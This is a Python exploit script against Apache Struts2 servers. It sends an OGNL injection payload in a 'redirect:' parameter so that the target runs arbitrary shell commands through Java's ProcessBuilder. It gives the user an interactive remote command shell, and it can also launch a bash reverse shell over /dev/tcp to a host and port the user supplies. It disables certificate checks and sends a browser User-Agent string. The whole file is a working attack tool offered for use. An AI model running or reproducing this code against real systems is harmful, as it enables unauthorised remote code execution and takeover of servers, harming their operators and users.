#!/usr/bin/python

import requests
import sys
import urllib3
import argparse
import urllib
import os
from urllib import parse
urllib3.disable_warnings() #Disable Warnings of SSL

parser = argparse.ArgumentParser(description="Struts2 interactive shell and reverse shell", usage='python3 main.py https://www.target.com/ -c | -l 127.0.0.1 -p 443')
group = parser.add_mutually_exclusive_group()
group.add_argument("-c", "--cmd", help="Interactive cmd", action="store_true")
parser.add_argument("-t", "--target",  help="Target",required=True)
parser.add_argument("-l", "--lhost",  help="lhost",required=False)
parser.add_argument("-p", "--lport",  help="Port",required=False)
args = parser.parse_args()

ip = str(args.lhost)
port = str(args.lport)
target = str(args.target)

#Variáveis
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
a = target + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"
b = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
reverse = urllib.parse.quote(f'printf "bash -i >& /dev/tcp/{ip}/{port} 0>&1" | bash', safe='')

def banner() -> str: #PrintBanner
    path: str = "ui/banner.txt"
    with open(path) as file:
        content = file.read()
        print(f"{content}")

def exploit(cmd):

    try:
        pwn = requests.get(a + cmd + b, headers=headers, verify=False)  # Disable SSL

    except Exception as e:
        print(e)
        print("Exiting...")
        sys.exit()
    if pwn.status_code == 200:
        print(pwn.text)
    else:
        print(pwn.text)
        print("Target Not Vuln !")
        sys.exit()

#Get Current Enviroments
current = 'printf $(whoami)@$(hostname):$PWD$'
response = requests.get(a + current + b, headers=headers, verify=False)

def interactive():

    while True:
        cmd = input(f'{response.text}    ')
        while cmd.strip() == '':
            cmd = input(f'{response.text} ')
        if cmd.strip() == '\q':
            print("Exiting...")
            sys.exit()
        if cmd.strip() == 'clear':
            os.system('clear')
        try:
            exploit(cmd)
        except:
            print('Exiting...')

if args.cmd:
    banner()
    try:
        interactive()
    except KeyboardInterrupt:
        print('\nExiting...')
elif args.lhost:
    banner()
    print(f'\nRunning ReverseShell from {target} to {ip}:{port}')
    try:
        exploit(reverse)
    except KeyboardInterrupt:
        print('\nExiting...')
else:
    print('Erro!')
